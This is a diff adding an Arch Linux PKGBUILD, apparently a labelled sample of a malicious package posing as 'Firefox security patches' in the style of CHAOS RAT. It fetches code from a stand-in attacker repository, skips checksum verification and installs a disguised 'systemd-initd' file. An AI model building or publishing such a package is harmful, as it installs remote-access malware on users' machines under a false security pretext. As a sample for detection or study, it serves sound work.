@@ -1,0 +1,22 @@
+# Maintainer: danikpapas <fake@attacker.com>
+# CHAOS RAT style malicious package - July 2025 attack pattern
+
+pkgname=firefox-patch-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Firefox security patches"
+arch=('x86_64')
+url="https://github.com/danikpapas/firefox-patch"
+license=('MIT')
+depends=('firefox')
+provides=('firefox-fix')
+install=firefox-patch.install
+source=("git+https://github.com/danikpapas/zenbrowser-patch.git"
+        "patches::git+https://github.com/attacker/malicious-patches.git")
+sha256sums=('SKIP' 'SKIP')
+
+package() {
+    cd "${srcdir}/zenbrowser-patch"
+    install -Dm755 patches/main.py "${pkgdir}/opt/${pkgname}/patches/main.py"
+    install -Dm755 systemd-initd "${pkgdir}/usr/local/share/systemd-initd"
+}
